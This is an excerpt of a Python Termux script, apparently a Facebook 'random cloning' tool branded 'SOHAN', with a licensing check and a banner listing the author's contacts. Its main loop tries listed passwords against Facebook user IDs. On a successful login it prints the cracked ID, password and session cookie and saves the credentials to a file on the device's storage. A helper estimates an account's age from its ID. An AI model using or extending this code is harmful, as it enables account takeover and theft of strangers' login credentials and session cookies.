...
def main():
    ...
    if opt == '1':
        FIRE()
    if opt == '6':
        os.system(f'xdg-open https://www.facebook.com/ITZ.XAYIN.XHOWDHURY.BED.PERSON/')
        os.system('Exit')
        return None
...
def tahunng(fx):
	if len(fx)==15:
		if fx[:10] in ['1000000000']       :sohan = '2009'
		elif fx[:9] in ['100000000']       :sohan = '2009'
		elif fx[:8] in ['10000000']        :sohan = '2009'
		elif fx[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:sohan = '2009'
		elif fx[:7] in ['1000006','1000007','1000008','1000009']:sohan = '2010'
		elif fx[:6] in ['100001']          :sohan = '2010-2011'
		elif fx[:6] in ['100002','100003'] :sohan = '2011-2012'
		elif fx[:6] in ['100004']          :sohan = '2012-2013'
		elif fx[:6] in ['100005','100006'] :sohan = '2013-2014'
		elif fx[:6] in ['100007','100008'] :sohan = '2014-2015'
		elif fx[:6] in ['100009']          :sohan = '2015'
		elif fx[:5] in ['10001']           :sohan = '2015-2016'
		elif fx[:5] in ['10002']           :sohan = '2016-2017'
		elif fx[:5] in ['10003']           :sohan = '2018'
		elif fx[:5] in ['10004']           :sohan = '2019'
		elif fx[:5] in ['10005']           :sohan = '2020'
		elif fx[:5] in ['10006','10007','10008']:sohan = '2021-2022'
		else:sohan=''
	elif len(fx) in [9,10]:
		sohan = '2008-2009'
	elif len(fx)==8:
...
class jalan:
    def __init__(self, z):
        for e in z + "\n":
            ...
            sys.stdout.flush()
            time.sleep(0.001)
update = requests.get("https://github.com/Devil-S1X4N/test/blob/main/aprv.txt").text
uuidd = str(os.geteuid()) + str(os.getlogin()) + str(os.getuid())
id = "".join(uuidd).replace("_","").replace("360","AHS").replace("u","9").replace("a","A")
plat = platform.version()[14:][:21][::-1].upper()+platform.release()[5:][::-1].upper()+platform.version()[:8]
xp = plat.replace(' ', '').replace('-', '').replace('#', '').replace(':', '').replace('.', '').replace(')', '').replace('(', '').replace('?', '').replace('=', '').replace('+', '').replace(';', '').replace('*', '').replace('_', '').replace('?', '').replace('  ', '')
bxd = ""
bumper = "Sᴋ᭄𝙎𝙊𝙃𝘼𝙉ᯓ=="+id+bxd+xp
myweb2 = requests.get("https://github.com/Devil-S1X4N/test/blob/main/aprv.txt").text
logo = ("""
\033[1;31m        _____  ____  _    _          _   _ 
\033[38;5;208m       / ____|/ __ \| |  | |   /\   | \ | |
\033[1;31m      | (___ | |  | | |__| |  /  \  |  \| |
\033[38;5;208m       \___ \| |  | |  __  | / /\ \ | . ` |
\033[1;32m       ____) | |__| | |  | |/ ____ \| |\  |
\033[38;5;208m      |_____/ \____/|_|  |_/_/    \_\_| \_|
\033[38;5;195m
       \033[41m\033[1;37--𝙸𝚃'𝚉-𝙿𝙸𝙽𝙸𝙺 𝚂𝙾𝙷𝙰𝙽 𝙱𝚁𝙰𝙽𝙳 𝙾𝙵𝙵 𝙼𝙸𝚁𝙿𝚄𝚁-\x1b[0m
\033[1;31m╔\033[1;36m═\033[1;31m═\033[1;32m═\033[1;33m═\033[1;34m═\033[1;35m═\033[1;36m═\033[1;31m═\033[1;32m═\033[1;33m═\033[1;34m═\033[1;35m═\033[1;36m═\033[1;31m═\033[1;32m═\033[1;33m═\033[1;34m═\033[1;35m═\033[31;37mSᴋ᭄𝙎𝙊𝙃𝘼𝙉ᯓ\033[1;32m═\033[1;33m═\033[1;34m═\033[1;35m═\033[1;36m═\033[1;31m═\033[1;32m═\033[1;33m═\033[1;34m═\033[1;35m═\033[1;36m═\033[1;31m═\033[1;32m═\033[1;33m═\033[1;34m═\033[1;35m═\033[1;36m═\033[1;31m╗ 
\033[1;32m║ \033[1;36m𝙰𝚄𝚃𝙷𝙾𝚁\033[1;31m•━━━━━✥\033[1;33m:𝚂𝙾𝙷𝙰𝙽 𝙰𝙷𝙼𝙴𝙳 𝚂𝙸𝚇𝙰𝙽 \033[38;5;208m(𝙼𝚁𝚅𝙶-1236)\033[1;32m║
\033[1;33m║ \033[1;36m𝙶𝙸𝚃𝙷𝚄𝙱\033[1;31m•━━━━━✥\033[1;32m:𝙳𝚎𝚟𝚒𝚕-𝚂1𝚇4𝙽-1236             \033[1;33m║
\033[1;34m║ \033[1;36m𝙵𝙰𝙲𝙴𝙱𝙾𝙾𝙺\033[1;31m•━━━✥\033[1;36m:Sohan\\___:*\❷/3:)\⓿/:*\❷/3:)\033[1;34m ║
\033[1;35m║ \033[1;36m𝚈𝙾𝚄𝚃𝚄𝙱𝙴\033[1;31m•━━━━✥\033[1;33m:𝙷𝙴𝙰𝚁𝚃 𝚃𝙾𝚄𝙲𝙷𝙸𝙽𝙶 𝙼𝚄𝚂𝙸𝙲 𝚃𝚅      \033[1;35m║
\033[1;36m║ \033[1;36m𝚆𝙷𝙰𝚃𝚂𝚆𝙰𝙿𝙿\033[1;31m•━━✥\033[1;32m:+966595246369                \033[1;36m║
\033[1;31m║ \033[1;36m𝚃𝙾𝙾𝙻𝚂\033[1;31m•━━━━━━✥\033[1;36m:𝚁𝙰𝙽𝙳𝙾𝙼 𝙲𝙻𝙾𝙽𝙸𝙶                \033[1;31m║
\033[1;32m║ \033[1;36m𝚅𝙴𝚁𝚂𝙸𝙾𝙽\033[1;31m•━━━━✥\033[1;31m:0.9.9                        \033[1;32m║
...
def qsbuy():
        try:
                os.system('clear')
                print(logo)
                x = requests.get("https://github.com/Devil-S1X4N/test/blob/main/aprv.txt").text
                if str("upppdate") in update:
                        ...
                        os.system(f"termux-open-url https://wa.me/+966595246369?text={bumper}")
                        qsbuy()
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                bal=tahunng(idf)
                print('\r\r\033[1;32m[SOHAN-OK]  ' +uid+ ' | ' +ps+ '\033[1;91m <==>' +bal+    '  \n\033[1;32m[‎‎🔐]\033[1;32mCOOKIE = \033[1;36m'+coki+  ' \n\033[1;36m[🎀]AGENT =\033[1;32m'+pro+'  \033[1;32m')
                cek_apk(session,coki)
                open('/sdcard/SOHAN-OK.txt', 'a').write( cid+' | '+ps+'\n')
                oks.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\r%s{x}[{xr}SOHAN]{x}][%s|%s][OK:{xr}%s{x}]'%(H,loop,tl,len(oks))),
        sys.stdout.flush()
    except:
        pass
